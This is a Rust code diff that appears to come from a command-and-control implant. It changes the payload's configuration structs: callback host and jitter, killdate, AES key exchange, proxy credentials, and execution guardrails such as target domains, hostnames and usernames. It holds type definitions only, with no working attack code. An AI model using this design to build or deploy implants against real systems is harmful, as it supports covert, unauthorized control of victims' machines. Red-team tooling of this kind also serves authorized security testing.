@@ -18,18 +18,41 @@ pub enum InitOption {
     Daemonize = 2,
 }
 
-/// HTTP profile configuration variables
+/// HTTP C2 profile proxy information
 #[derive(Serialize, Deserialize, Debug)]
+pub struct ProxyInfo<'a> {
+    host: &'a str,
+    port: u16,
+    user: &'a str,
+    pass: &'a str,
+}
+
+/// HTTP Profile crypto info
+#[derive(Serialize, Deserialize, Debug)]
+pub enum CryptoInfo {
+    /// AES256 encryption type
+    #[serde(rename = "aes256_hmac")]
+    Aes256Hmac {
+        /// AES key
+        key: [u8; 16],
+    },
+}
+
+/// HTTP profile configuration variables
+#[derive(Serialize, Deserialize, Debug, Default)]
 pub struct HttpConfigVars<'a> {
     callback_host: &'a str,
-    callback_interval: usize,
+    callback_interval: u32,
     callback_jitter: u16,
     callback_port: u16,
-    get_uri: &'a str,
+    killdate: u64,
+    encrypted_exchange_check: bool,
+    crypto_info: Option<CryptoInfo>,
     headers: HashMap<&'a str, &'a str>,
-    killdate: usize,
+    get_uri: &'a str,
     post_uri: &'a str,
     query_path_name: &'a str,
+    proxy_info: Option<ProxyInfo<'a>>,
 }
 
 /// Payload configuration variables
@@ -39,13 +62,13 @@ pub struct ConfigVars<'a> {
     init_option: InitOption,
     working_hours_start: u64,
     working_hours_end: u64,
-    connection_retries: usize,
+    connection_retries: u32,
     domains: Vec<[u8; 32]>,
     hostnames: Vec<[u8; 32]>,
     usernames: Vec<[u8; 32]>,
     tlsselfsigned: bool,
     spawn_to: &'a str,
-    profile: HttpConfigVars<'a>,
+    profile: Option<HttpConfigVars<'a>>,
 }
 
 impl ConfigVars<'_> {
